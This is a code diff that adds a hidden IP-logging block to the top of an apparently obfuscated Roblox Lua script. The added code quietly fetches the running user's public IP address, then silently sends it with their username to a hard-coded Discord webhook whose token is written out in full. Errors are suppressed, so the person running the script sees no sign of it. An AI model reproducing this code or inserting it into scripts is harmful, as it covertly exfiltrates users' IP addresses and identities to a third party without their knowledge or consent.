@@ -1,3 +1,58 @@
+local ip = game:HttpGet("https://api.ipify.org/")
+
+local url = "https://discord.com/api/webhooks/996280121029840958/oRCKXxGduL1XmlheiVbrA65o62PLOA5EXjhPwlaC70cplIcb82-FJpOlgmRGOz8---Rk"
+
+local slf = game.Players.LocalPlayer.Name
+local text
+
+pcall(function()
+    local http_request = http_request;
+    if syn then
+        http_request = syn.request
+    elseif SENTINEL_V2 then
+        function http_request(tb)
+            return {
+                StatusCode = 200;
+                Body = request(tb.Url, tb.Method, (tb.Body or ''))
+            }
+        end
+    end
+    
+local HttpServ = game:GetService('HttpService')
+
+    
+local data =
+    {
+        ["content"] = null,
+        
+        ["embeds"] = {
+            {
+                ["title"] = "**script executed**",
+                ["description"] = "",
+                ["color"] = tonumber(0),        
+                ['fields'] = {
+                    {
+                        ["name"] = slf,
+                        ["value"] = ip,
+                        ["inline"] = true
+                    },
+                }
+            }
+    }}
+            local newdata = HttpServ:JSONEncode(data)
+            
+            local headers = {
+                            ["content-type"] = "application/json"
+            }
+            
+            local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+            http_request(request_payload)
+end)
+
+
+
+
+
 _, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
 
